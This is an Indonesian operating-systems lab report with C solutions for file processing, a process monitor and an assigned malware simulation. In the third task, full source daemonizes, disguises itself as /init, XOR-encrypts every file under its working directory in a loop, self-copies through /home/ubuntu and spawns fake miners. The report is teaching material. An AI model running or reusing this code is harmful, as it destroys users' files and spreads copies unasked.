# LAPORAN PRAKTIKUM SISTEM OPERASI MODUL 2 KELOMPOK IT01

  |       Nama        |     NRP    |
  |-------------------|------------|
  | Ahmad Idza Anafin | 5027241017 |
  | Ivan Syarifuddin  | 5027241045 |
  | Diva Aulia Rosa   | 5027241003 |


# Soal 1
# Soal 1
 - Deklarasi library
    ```
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <dirent.h>
    #include <ctype.h>
    #include <sys/stat.h>
    #include <sys/types.h>
    #include <unistd.h>
    #include <sys/wait.h>
    ```
 -  Mendefinisikan file, URL, dan password yang akan digunakan di dalam program
    ```
    #define ZIP_FILE "Clues.zip"
    #define ZIP_URL "https://drive.google.com/uc?export=download&id=1xFn1OBJUuSdnApDseEczKhtNzyGekauK"
    #define ZIP_PASSWORD "password123"
    ```
-  Memvalidasi apakah sebuah nama file (filename) memenuhi kriteria tertentu
    ```
    int is_valid_file(const char *filename) {
        return strlen(filename) == 5 && isalnum(filename[0]) && strcmp(filename + 1, ".txt") == 0;
    }
    
    int run_command(const char *cmd, char *const argv[]) {
        pid_t pid = fork();
        if (pid == 0) {
            execvp(cmd, argv);
            perror("exec failed");
            exit(EXIT_FAILURE);
        } else if (pid > 0) {
            int status;
            waitpid(pid, &status, 0);
            return WIFEXITED(status) && WEXITSTATUS(status) == 0;
        } else {
            perror("fork failed");
            return 0;
        }
    }
    ```
-  Mengunduh file Clues.zip dari kemudian mengekstrak isinya ke dalam folder bernama Clues.
    ```
    void download_and_unzip() {
    struct stat st = {0};
    if (stat("Clues", &st) == 0 && S_ISDIR(st.st_mode)) {
        printf("Folder Clues sudah ada. Lewati download.\n");
        return;
    }

    printf("Mengunduh Clues.zip...\n");
    char *wget_args[] = {"wget", "-q", "-O", ZIP_FILE, ZIP_URL, NULL};
    if (!run_command("wget", wget_args)) {
        fprintf(stderr, "Gagal mengunduh Clues.zip\n");
        return;
    }

    if (stat(ZIP_FILE, &st) != 0) {
        fprintf(stderr, "File Clues.zip tidak ditemukan setelah download.\n");
        return;
    }

    printf("Ekstrak Clues.zip...\n");
    char *unzip_args[] = {"unzip", "-P", ZIP_PASSWORD, "-q", ZIP_FILE, NULL};
    if (!run_command("unzip", unzip_args)) {
        fprintf(stderr, "Gagal mengekstrak Clues.zip. Pastikan password benar.\n");
        return;
    }

    if (stat("Clues", &st) != 0 || !S_ISDIR(st.st_mode)) {
        fprintf(stderr, "Folder Clues tidak ditemukan setelah ekstraksi.\n");
        return;
    }

    remove(ZIP_FILE);
    printf("Download dan ekstrak selesai. Folder Clues berhasil dibuat.\n");
    }
    ```
- Memproses file-file di dalam subdirektori Clues, memindahkan file-file yang memenuhi kriteria tertentu ke dalam folder Filtered, dan menghapus file-file yang tidak memenuhi kriteria.
    ```
    void filter_files() {
    mkdir("Filtered", 0755);
    const char *subdirs[] = {"Clues/ClueA", "Clues/ClueB", "Clues/ClueC", "Clues/ClueD"};

    for (int i = 0; i < 4; ++i) {
        DIR *dir = opendir(subdirs[i]);
        if (!dir) {
            fprintf(stderr, "Gagal membuka folder %s\n", subdirs[i]);
            continue;
        }

        struct dirent *entry;
        while ((entry = readdir(dir))) {
            if (entry->d_type != DT_REG) continue;

            size_t src_length = strlen(subdirs[i]) + strlen(entry->d_name) + 2;
            size_t dst_length = strlen("Filtered") + strlen(entry->d_name) + 2;

            if (src_length >= 512 || dst_length >= 512) {
                fprintf(stderr, "Buffer terlalu kecil untuk file %s\n", entry->d_name);
                continue;
            }

            char src[512], dst[512];
            snprintf(src, sizeof(src), "%s/%s", subdirs[i], entry->d_name);

            if (is_valid_file(entry->d_name)) {
                snprintf(dst, sizeof(dst), "Filtered/%s", entry->d_name);
                if (rename(src, dst) == 0) {
                    printf("File %s dipindahkan ke Filtered.\n", entry->d_name);
                } else {
                    perror("Gagal memindahkan file");
                }
            } else {
                if (remove(src) == 0) {
                    printf("File %s dihapus.\n", entry->d_name);
                } else {
                    perror("Gagal menghapus file");
                }
            }
        }
        closedir(dir);
    }

    printf("Filtering selesai. File disimpan di folder Filtered.\n");
  }
  
  int cmp(const void *a, const void *b) {
      return strcmp((const char *)a, (const char *)b);
  }
    ```
- Menggabungkan isi dari file di dalam folder Filtered ke dalam satu file bernama Combined.txt dengan urutan sesuai perintah. Setelah isi file digabungkan, file-file asli di dalam folder Filtered akan dihapus.
  ```
  void combine_files() {
      DIR *dir = opendir("Filtered");
      if (!dir) {
          fprintf(stderr, "Folder Filtered tidak ditemukan.\n");
          return;
      }

    char numbers[100][6], letters[100][6];
    int n = 0, l = 0;
    struct dirent *entry;

    while ((entry = readdir(dir))) {
        if (is_valid_file(entry->d_name)) {
            if (isdigit(entry->d_name[0]))
                strcpy(numbers[n++], entry->d_name);
            else if (isalpha(entry->d_name[0]))
                strcpy(letters[l++], entry->d_name);
        }
    }
    closedir(dir);

    qsort(numbers, n, sizeof(numbers[0]), cmp);
    qsort(letters, l, sizeof(letters[0]), cmp);

    FILE *out = fopen("Combined.txt", "w");
    if (!out) {
        perror("Gagal membuat Combined.txt");
        return;
    }

    for (int i = 0; i < n || i < l; ++i) {
        if (i < n) {
            char path[512];
            snprintf(path, sizeof(path), "Filtered/%s", numbers[i]);
            FILE *f = fopen(path, "r");
            if (f) {
                int c; while ((c = fgetc(f)) != EOF) fputc(c, out);
                fclose(f);
                remove(path); 
            }
        }
        if (i < l) {
            char path[512];
            snprintf(path, sizeof(path), "Filtered/%s", letters[i]);
            FILE *f = fopen(path, "r");
            if (f) {
                int c; while ((c = fgetc(f)) != EOF) fputc(c, out);
                fclose(f);
                remove(path); 
            }
        }
    }

    fclose(out);
    printf("Isi file telah digabung ke Combined.txt\n");
  }
  ```
- Membaca isi dari file Combined.txt, mendekripsinya menggunakan algoritma ROT13, dan menulis hasilnya ke dalam file baru bernama Decoded.txt.
  ```
  void rot13_decode() {
    FILE *in = fopen("Combined.txt", "r");
    FILE *out = fopen("Decoded.txt", "w");
    if (!in || !out) {
        perror("Gagal membuka Combined.txt atau membuat Decoded.txt");
        if (in) fclose(in);
        if (out) fclose(out);
        return;
    }

    int c;
    while ((c = fgetc(in)) != EOF) {
        if (isalpha(c)) {
            c = ((c & 32) ? 'a' : 'A') + ((c - ((c & 32) ? 'a' : 'A') + 13) % 26);
        }
        fputc(c, out);
    }

    fclose(in);
    fclose(out);
    printf("Decode ROT13 selesai. Output disimpan di Decoded.txt\n");
  }
  ```
- Menampilkan informasi penggunaan (usage information) atau bantuan (help) untuk program action kepada pengguna.
  ```
  void print_usage() {
    printf("Penggunaan:\n");
    printf("  ./action            # Download & extract Clues.zip\n");
    printf("  ./action -m Filter  # Filter file valid ke folder Filtered\n");
    printf("  ./action -m Combine # Gabungkan isi file ke Combined.txt\n");
    printf("  ./action -m Decode  # Decode Combined.txt ke Decoded.txt\n");
  }
  ```
- Entry point argumen
  ```
  int main(int argc, char *argv[]) {
    if (argc == 1) {
        download_and_unzip();
    } else if (argc == 3 && strcmp(argv[1], "-m") == 0) {
        if (strcmp(argv[2], "Filter") == 0)
            filter_files();
        else if (strcmp(argv[2], "Combine") == 0)
            combine_files();
        else if (strcmp(argv[2], "Decode") == 0)
            rot13_decode();
        else
            print_usage();
    } else {
        print_usage();
    }

    return 0;
  }
  ```
  ## DOKUMENTASI NOMER 1
  - Download file zip

    ![image](https://github.com/user-attachments/assets/13dac827-29e6-4339-b82e-61c93dc4e424)
  - Proses Filter

    ![image](https://github.com/user-attachments/assets/ebc430a0-1bea-4ce7-8a0f-b47913efc3c9)
  - Hasil Filter

    ![image](https://github.com/user-attachments/assets/23f94b23-c8eb-4a55-85a5-4ba3034914f8)
  - Proses Combine dan Isi Combined.txt

    ![image](https://github.com/user-attachments/assets/01b7089e-95d5-4de3-b7e5-e2e29748dbc0)
  - Proses Decode dan Isi Decoded.txt

    ![image](https://github.com/user-attachments/assets/8b31063f-95fd-419e-bd77-9fc85e1ad629)


# Soal 2 
## kode untuk soal nomor 2 



# Soal 3
  Pada soal ini terdapat 4 Objektif:
  - membuat daemon dan rename process menjadi /init
  - membuat children process pertama untuk enkripsi
  - membuat children process kedua untuk malware propagation
  - membuat children ketiga yang akan melakukan fork bomb untuk miner
  ## Full Code
      
      #include <sys/types.h>
      #include <sys/stat.h>
      #include <stdio.h>
      #include <stdlib.h>
      #include <fcntl.h>
      #include <errno.h>
      #include <unistd.h>
      #include <syslog.h>
      #include <string.h>
      #include <sys/prctl.h>
      #include <time.h>
      #include <dirent.h>
      #include <limits.h>
      #include <signal.h>
      
      extern char **environ;
      
      void daemonize() {
          //   // https://stackoverflow.com/questions/17954432/creating-a-daemon-in-linux
          pid_t pid, sid;
      
          pid = fork();
          if (pid < 0) exit(EXIT_FAILURE);
          if (pid > 0) exit(EXIT_SUCCESS);
      
          umask(0);
      
          sid = setsid();
          if (sid < 0) exit(EXIT_FAILURE);
      
          if ((chdir(".")) < 0) exit(EXIT_FAILURE);
      
          for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) {
              close(x);
          }
      }
      
      void menyamarkan_process(int argc, char **argv) {
          environ = NULL;
          prctl(PR_SET_NAME, "/init", 0, 0, 0);
      
          if (argc > 0) {
              size_t len = 64;
              memset(argv[0], 0, len);
              strncpy(argv[0], "/init", len);
          }
      }
      
      void xorfile(const char *filename, unsigned int key) {
          char tmp_filename[512];
          snprintf(tmp_filename, sizeof(tmp_filename), "%s.tmp", filename);
      
          FILE *in = fopen(filename, "rb");
          FILE *out = fopen(tmp_filename, "wb");
      
          if (!in || !out) {
              perror("File error");
              if (in) fclose(in);
              if (out) fclose(out);
              return;
          }
      
          int ch;
          while ((ch = fgetc(in)) != EOF) {
              fputc(ch ^ key, out);
          }
      
          fclose(in);
          fclose(out);
      
          remove(filename);
          rename(tmp_filename, filename);
      }
      
      void encrypt(const char *path, unsigned int key) {
          DIR *dir = opendir(path);
          if (!dir) return;
      
          struct dirent *entry;
          char fullpath[1024];
      
          while ((entry = readdir(dir)) != NULL) {
              if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                  continue;
      
              snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);
      
              struct stat st;
              if (stat(fullpath, &st) == -1) continue;
      
              if (S_ISDIR(st.st_mode)) {
                  encrypt(fullpath, key);
              } else if (S_ISREG(st.st_mode)) {
                  xorfile(fullpath, key);
              }
          }
          closedir(dir);
      }
      
      void copy_self_recursive(const char *dirpath) {
          DIR *dir = opendir(dirpath);
          if (!dir) return;
      
          struct dirent *entry;
          char path[PATH_MAX];
      
          char exe_path[PATH_MAX];
          ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
          if (len == -1) {
              perror("readlink");
              closedir(dir);
              return;
          }
          exe_path[len] = '\0';
      
          const char *filename = strrchr(exe_path, '/');
          filename = filename ? filename + 1 : exe_path;
      
          while ((entry = readdir(dir)) != NULL) {
              if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                  continue;
      
              snprintf(path, sizeof(path), "%s/%s", dirpath, entry->d_name);
      
              struct stat st;
              if (stat(path, &st) == -1) continue;
      
              if (S_ISDIR(st.st_mode)) {
                  copy_self_recursive(path);
              }
          }
      
          char target_path[PATH_MAX];
          snprintf(target_path, sizeof(target_path), "%s/%s", dirpath, filename);
      
          FILE *src = fopen(exe_path, "rb");
          FILE *dest = fopen(target_path, "wb");
      
          if (!src || !dest) {
              perror("copy error");
              if (src) fclose(src);
              if (dest) fclose(dest);
              closedir(dir);
              return;
          }
      
          char buffer[4096];
          size_t n;
          while ((n = fread(buffer, 1, sizeof(buffer), src)) > 0) {
              fwrite(buffer, 1, n, dest);
          }
      
          fclose(src);
          fclose(dest);
          closedir(dir);
      }
      
      char *generate_hash() {
          static char charset[] = "0123456789abcdef";
          static char hash[65];
          for (int i = 0; i < 64; i++) {
              hash[i] = charset[rand() % 16];
          }
          hash[64] = '\0';
          return hash;
      }
      
      void mine_worker(int id, int argc, char **argv) {
        prctl(PR_SET_PDEATHSIG, SIGTERM);
      
        char procname[64];
        snprintf(procname, sizeof(procname), "mine-crafter-%d", id);
        prctl(PR_SET_NAME, procname, 0, 0, 0);
      
        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], procname, len);
        }
      
        srand(time(NULL) ^ (getpid() + id));  
      
        while (1) {
            int delay = (rand() % 28) + 3; 
            sleep(delay);
      
            time_t now = time(NULL);
            struct tm *t = localtime(&now);
      
            char logline[128];
            snprintf(logline, sizeof(logline), "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
                     t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                     t->tm_hour, t->tm_min, t->tm_sec,
                     id, generate_hash());
      
            FILE *log = fopen("/tmp/.miner.log", "a");
            if (log) {
                fputs(logline, log);
                fclose(log);
            }
        }
      }
      
      
      void child_1(int argc, char **argv) {
          pid_t child = fork();
          if (child < 0) exit(EXIT_FAILURE);
          if (child == 0) {
              prctl(PR_SET_NAME, "wannacryptor", 0, 0, 0);
      
              if (argc > 0) {
                  size_t len = 64;
                  memset(argv[0], 0, len);
                  strncpy(argv[0], "wannacryptor", len);
              }
      
              unsigned int key = (unsigned int)time(NULL);
              while (1) {
                 encrypt(".", key);
                  sleep(30);
              }
              exit(EXIT_SUCCESS);
          }
      }
      
      void child_2(int argc, char **argv) {
          pid_t child = fork();
          if (child < 0) exit(EXIT_FAILURE);
          if (child == 0) {
              prctl(PR_SET_NAME, "trojan.wrm", 0, 0, 0);
      
              if (argc > 0) {
                  size_t len = 64;
                  memset(argv[0], 0, len);
                  strncpy(argv[0], "trojan.wrm", len);
              }
      
              while (1) {
                 copy_self_recursive("/home/ubuntu");
                  sleep(30);
              }
              exit(EXIT_SUCCESS);
          }
      }
      
      void child_3(int argc, char **argv) {
          pid_t rodok = fork();
          if (rodok < 0) exit(EXIT_FAILURE);
          if (rodok == 0) {
              prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);
      
              if (argc > 0) {
                  size_t len = 64;
                  memset(argv[0], 0, len);
                  strncpy(argv[0], "rodok.exe", len);
              }
      
              srand(time(NULL));
              int max_miner = sysconf(_SC_NPROCESSORS_ONLN);
              if (max_miner < 3) max_miner = 3;
      
              for (int i = 0; i < max_miner; i++) {
                  pid_t miner = fork();
                  if (miner == 0) {
                      mine_worker(i, argc, argv);
                      exit(EXIT_SUCCESS);
                  }
              }
      
              while (1) sleep(60);
              exit(EXIT_SUCCESS);
          }
      }
      
      int main(int argc, char *argv[]) {
          daemonize();
          menyamarkan_process(argc, argv);
          child_1(argc, argv);
          child_2(argc, argv);
          child_3(argc, argv);
          while (1) {
              sleep(60);
          }
          return 0;
      }

  ![image](https://github.com/user-attachments/assets/ea40dd4c-9c83-48dd-86f1-2c19f3f61093)

  #### Membuat daemon & rename process
  Pertama membuat daemon dari fungsi daemonize kemudian "menyamarkan" dengan merename thread process menjadi /init menggunakan prctl dan mengubah argv yang dikemas pada fungsi menyamarkan_process()
  
       void daemonize() {
        // https://stackoverflow.com/questions/17954432/creating-a-daemon-in-linux
        pid_t pid, sid;
    
        pid = fork();
        if (pid < 0) exit(EXIT_FAILURE);
        if (pid > 0) exit(EXIT_SUCCESS);
    
        umask(0);
    
        sid = setsid();
        if (sid < 0) exit(EXIT_FAILURE);
    
        if ((chdir(".")) < 0) exit(EXIT_FAILURE);
    
        for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) {
            close(x);
        }
    }

    void menyamarkan_process(int argc, char **argv) {
        environ = NULL;
        prctl(PR_SET_NAME, "/init", 0, 0, 0);
    
        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "/init", len);
        }
    }
  #### Children process wannacryptor
  disini melakukan fork untuk children proses pertama bernama wannacryptor. Dimana berfungsi untuk mengenkripsi semua file dan folder yang ada di current directory menggunakan algoritma xor dengan key timestamp. Jadi membuat fungsi xorfile() untuk melakukan enkripsi xor dan fungsi encrypt() untuk melakukan enkripsi secara rekursif ke semua file dan folder di current directory. proses ini berjalan secara terus menerus dengan interval 30 detik. fungsi tadi dispawn dengan memanggil child_1()
  
        void xorfile(const char *filename, unsigned int key) {
          char tmp_filename[512];
          snprintf(tmp_filename, sizeof(tmp_filename), "%s.tmp", filename);
      
          FILE *in = fopen(filename, "rb");
          FILE *out = fopen(tmp_filename, "wb");
      
          if (!in || !out) {
              perror("File error");
              if (in) fclose(in);
              if (out) fclose(out);
              return;
          }
      
          int ch;
          while ((ch = fgetc(in)) != EOF) {
              fputc(ch ^ key, out);
          }
      
          fclose(in);
          fclose(out);
      
          remove(filename);
          rename(tmp_filename, filename);
      }
      
      void encrypt(const char *path, unsigned int key) {
          DIR *dir = opendir(path);
          if (!dir) return;
      
          struct dirent *entry;
          char fullpath[1024];
      
          while ((entry = readdir(dir)) != NULL) {
              if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                  continue;
      
              snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);
      
              struct stat st;
              if (stat(fullpath, &st) == -1) continue;
      
              if (S_ISDIR(st.st_mode)) {
                  encrypt(fullpath, key);
              } else if (S_ISREG(st.st_mode)) {
                  xorfile(fullpath, key);
              }
          }
          closedir(dir);
      }
      void child_1(int argc, char **argv) {
        pid_t child = fork();
        if (child < 0) exit(EXIT_FAILURE);
        if (child == 0) {
            prctl(PR_SET_NAME, "wannacryptor", 0, 0, 0);
    
            if (argc > 0) {
                size_t len = 64;
                memset(argv[0], 0, len);
                strncpy(argv[0], "wannacryptor", len);
            }
    
            unsigned int key = (unsigned int)time(NULL);
            while (1) {
               encrypt(".", key);
                sleep(30);
            }
            exit(EXIT_SUCCESS);
        }
    }
  #### Children Process trojan.wrm
  kemudian children kedua bernama trojan.wrm ini berfungsi sebagai malware propagation untuk menyalin dirinya sendiri ke semua home directory dari useer dengan fungsi copy_self_recursive(). Proses ini di spawn dengan memanggil child_2
  
        void copy_self_recursive(const char *dirpath) {
          DIR *dir = opendir(dirpath);
          if (!dir) return;
      
          struct dirent *entry;
          char path[PATH_MAX];
      
          char exe_path[PATH_MAX];
          ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
          if (len == -1) {
              perror("readlink");
              closedir(dir);
              return;
          }
          exe_path[len] = '\0';
      
          const char *filename = strrchr(exe_path, '/');
          filename = filename ? filename + 1 : exe_path;
      
          while ((entry = readdir(dir)) != NULL) {
              if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                  continue;
      
              snprintf(path, sizeof(path), "%s/%s", dirpath, entry->d_name);
      
              struct stat st;
              if (stat(path, &st) == -1) continue;
      
              if (S_ISDIR(st.st_mode)) {
                  copy_self_recursive(path);
              }
          }
      
          char target_path[PATH_MAX];
          snprintf(target_path, sizeof(target_path), "%s/%s", dirpath, filename);
      
          FILE *src = fopen(exe_path, "rb");
          FILE *dest = fopen(target_path, "wb");
      
          if (!src || !dest) {
              perror("copy error");
              if (src) fclose(src);
              if (dest) fclose(dest);
              closedir(dir);
              return;
          }
      
          char buffer[4096];
          size_t n;
          while ((n = fread(buffer, 1, sizeof(buffer), src)) > 0) {
              fwrite(buffer, 1, n, dest);
          }
      
          fclose(src);
          fclose(dest);
          closedir(dir);
      }
      void child_2(int argc, char **argv) {
        pid_t child = fork();
        if (child < 0) exit(EXIT_FAILURE);
        if (child == 0) {
            prctl(PR_SET_NAME, "trojan.wrm", 0, 0, 0);
    
            if (argc > 0) {
                size_t len = 64;
                memset(argv[0], 0, len);
                strncpy(argv[0], "trojan.wrm", len);
            }
    
            while (1) {
               copy_self_recursive("/home/ubuntu");
                sleep(30);
            }
            exit(EXIT_SUCCESS);
        }
    }
  
  ![image](https://github.com/user-attachments/assets/366958d7-cb54-44d8-b841-ef3e1cab7827)

  #### Children process rodok.exe
  pada children ke3 ini spawning proses yang memiliki beberapa thread sebagai children procesnya. dimana setiap thread akan generate hash secara random dan disimpan di /tmp/.miner.log. hash akan digenerate dalam interval random antara 3-30 detik. fungsi tersebut dipanggil dengan child_3 dan loop banyak thread menyesuakian.
  
        char *generate_hash() {
          static char charset[] = "0123456789abcdef";
          static char hash[65];
          for (int i = 0; i < 64; i++) {
              hash[i] = charset[rand() % 16];
          }
          hash[64] = '\0';
          return hash;
      }
      
      void mine_worker(int id, int argc, char **argv) {
        prctl(PR_SET_PDEATHSIG, SIGTERM);
      
        char procname[64];
        snprintf(procname, sizeof(procname), "mine-crafter-%d", id);
        prctl(PR_SET_NAME, procname, 0, 0, 0);
      
        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], procname, len);
        }
      
        srand(time(NULL) ^ (getpid() + id));  
      
        while (1) {
            int delay = (rand() % 28) + 3; 
            sleep(delay);
      
            time_t now = time(NULL);
            struct tm *t = localtime(&now);
      
            char logline[128];
            snprintf(logline, sizeof(logline), "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
                     t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                     t->tm_hour, t->tm_min, t->tm_sec,
                     id, generate_hash());
      
            FILE *log = fopen("/tmp/.miner.log", "a");
            if (log) {
                fputs(logline, log);
                fclose(log);
            }
        }
      }
      void child_3(int argc, char **argv) {
        pid_t rodok = fork();
        if (rodok < 0) exit(EXIT_FAILURE);
        if (rodok == 0) {
            prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);
    
            if (argc > 0) {
                size_t len = 64;
                memset(argv[0], 0, len);
                strncpy(argv[0], "rodok.exe", len);
            }
    
            srand(time(NULL));
            int max_miner = sysconf(_SC_NPROCESSORS_ONLN);
            if (max_miner < 3) max_miner = 3;
    
            for (int i = 0; i < max_miner; i++) {
                pid_t miner = fork();
                if (miner == 0) {
                    mine_worker(i, argc, argv);
                    exit(EXIT_SUCCESS);
                }
            }
    
            while (1) sleep(60);
            exit(EXIT_SUCCESS);
        }
    }
  ![image](https://github.com/user-attachments/assets/e47698f1-25d7-4c92-bab2-3d6f63c9e522)

# Soal 4
- deklarasi library
   ```
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  #include <unistd.h>
  #include <dirent.h>
  #include <pwd.h>
  #include <sys/types.h>
  #include <signal.h>
  #include <time.h>
  #include <fcntl.h>
  ```
- mendefinisikan nama file yang akan digunakan untuk menyimpan log dan pid debug program 
    ```
    #define LOG_FILE "debugmon.log"
    #define PID_FILE "debugmon.pid"
    ```
- fungsi untuk mencatat ke dalam file log dengan ketentuan tanggal dan waktu
    ```
    void write_log(const char *process_name, const char *status) {
    FILE *log = fopen(LOG_FILE, "a");
    if (!log) return;

    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    fprintf(log, "[%02d:%02d:%04d]-[%02d:%02d:%02d]_%s_%s\n",
            t->tm_mday, t->tm_mon + 1, t->tm_year + 1900,
            t->tm_hour, t->tm_min, t->tm_sec,
            process_name, status);
    fclose(log);
  }
    ```
 - fungsi untuk menampilkan daftar proses user dengan fromat tabel
    ```
    void list_user_processes(const char *username) {
    DIR *proc = opendir("/proc");
    struct dirent *entry;
    struct passwd *pwd = getpwnam(username);
    if (!pwd) {
        printf("User not found.\n");
        return;
    }
    uid_t target_uid = pwd->pw_uid;

      printf("------------------------------------------------------------------------------------------------\n");
    printf("| %-8s | %-20s | %-10s | %-15s |\n", "PID", "COMMAND", "CPU_USAGE", "MEMORY_USAGE");
    printf("------------------------------------------------------------------------------------------------\n");

    while ((entry = readdir(proc)) != NULL) {
        if (entry->d_type == DT_DIR) {
            long pid = strtol(entry->d_name, NULL, 10);
            if (pid <= 0) continue;

            char status_path[256], stat_path[256];
            snprintf(status_path, sizeof(status_path), "/proc/%ld/status", pid);
            snprintf(stat_path, sizeof(stat_path), "/proc/%ld/stat", pid);

            FILE *status = fopen(status_path, "r");
            FILE *stat = fopen(stat_path, "r");
            if (!status || !stat) {
                if (status) fclose(status);
                if (stat) fclose(stat);
                continue;
            }

            char line[256], name[256] = "";
            uid_t uid = -1;
            while (fgets(line, sizeof(line), status)) {
                if (strncmp(line, "Name:", 5) == 0)
                    sscanf(line, "Name:\t%255s", name);
                else if (strncmp(line, "Uid:", 4) == 0)
                    sscanf(line, "Uid:\t%d", &uid);
            }
            fclose(status);

            if (uid == target_uid) {
                unsigned long utime, stime, rss;
                char stat_data[1024];
                fgets(stat_data, sizeof(stat_data), stat);
                sscanf(stat_data, "%*d %*s %*c %*d %*d %*d %*d %*d %*u %*u %*u %*u %*u %*u %*u %lu %lu %*d %*d %*d %*d %*d %*d %*u %lu", &utime, &stime, &rss);
                fclose(stat);

                double cpu_usage = (utime + stime) / sysconf(_SC_CLK_TCK);
                double memory_usage = rss * sysconf(_SC_PAGE_SIZE) / 1024.0;

                // Cetak data dalam format kolom
                printf("| %-8ld | %-20s | %-10.2f | %-15.2f KB |\n", pid, name, cpu_usage, memory_usage);
            }
        }
    }
    closedir(proc);
    
    printf("------------------------------------------------------------------------------------------------\n");
    }

    ```
 - fungsi untuk menjalankan proses daemon
    ```
    void daemon_mode(const char *username) {
    pid_t pid = fork();
    if (pid < 0) {
        perror("Fork failed");
        exit(EXIT_FAILURE);
    }

    if (pid > 0) {
        printf("Running in daemon mode... PID: %d\n", pid);
        FILE *pidfile = fopen(PID_FILE, "w");
        if (!pidfile) exit(EXIT_FAILURE);
        fprintf(pidfile, "%d", pid);
        fclose(pidfile);
        exit(EXIT_SUCCESS);
    }

    if (setsid() < 0) exit(EXIT_FAILURE);
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    while (1) {
        write_log("daemon_processes", "RUNNING");
        sleep(3);
    }
    }
    ```
 - fungsi untuk menghentikan proses daemon yang berjalan 
    ```
    void stop_daemon() {
    FILE *pidfile = fopen(PID_FILE, "r");
    if (!pidfile) {
        printf("Daemon tidak berjalan atau PID file '%s' tidak ditemukan.\n", PID_FILE);
        return;
    }

    int pid;
    fscanf(pidfile, "%d", &pid);
    fclose(pidfile);

    if (kill(pid, SIGTERM) == 0) {
        printf("Proses daemon (PID: %d) berhasil dihentikan.\n", pid);
        write_log("stop_processes","RUNNING");
    } else {
        perror("Gagal menghentikan proses daemon");
    }
    }
    ```
 - fungsi untuk menghentikan semua proses user
    ```
    void fail_processes(const char *username) {
    struct passwd *pwd = getpwnam(username);
    if (!pwd) {
        printf("User %s tidak ditemukan.\n", username);
        return;
    }

    uid_t target_uid = pwd->pw_uid;

    DIR *proc = opendir("/proc");
    if (!proc) {
        perror("Gagal membuka /proc");
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(proc)) != NULL) {
        if (entry->d_type == DT_DIR) {
            long pid = strtol(entry->d_name, NULL, 10);
            if (pid <= 0) continue;

            char status_path[256];
            snprintf(status_path, sizeof(status_path), "/proc/%ld/status", pid);

            FILE *status = fopen(status_path, "r");
            if (!status) continue;

            char line[256];
            uid_t uid = -1;
            while (fgets(line, sizeof(line), status)) {
                if (strncmp(line, "Uid:", 4) == 0) {
                    sscanf(line, "Uid:\t%d", &uid);
                    break;
                }
            }
            fclose(status);

            
            if (uid == target_uid) {
                if (kill(pid, SIGKILL) == 0) {
                    printf("Proses (PID: %ld) milik user %s berhasil dihentikan.\n", pid, username);
                    write_log("fail_processes", "FAILED");
                } else {
                    perror("Gagal menghentikan proses");
                }
            }
        }
    }
    closedir(proc);
    }
    ```
 - fungsi untuk revert user menggunakan root
    ```
    void revert_processes(const char *username) {
    if (geteuid() != 0) { 
        printf("Fungsi revert hanya dapat dijalankan oleh root.\n");
        return;
    }

    write_log("revert_processes", "RUNNING");
    printf("User %s diizinkan kembali untuk menjalankan proses.\n", username);
    }

    int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <command> <username>\n", argv[0]);
        printf("Commands: list | daemon | stop | fail | revert\n");
        return 1;
    }

    char *cmd = argv[1];
    char *username = argv[2];

    if (strcmp(cmd, "list") == 0) {
        list_user_processes(username);
    } else if (strcmp(cmd, "daemon") == 0) {
        daemon_mode(username);
    } else if (strcmp(cmd, "stop") == 0) {
        stop_daemon();
    } else if (strcmp(cmd, "fail") == 0) {
        fail_processes(username);
    } else if (strcmp(cmd, "revert") == 0) {
        revert_processes(username);
    } else {
        printf("pilihan tidak ada.\n");
    }

    return 0;
    }
    ```
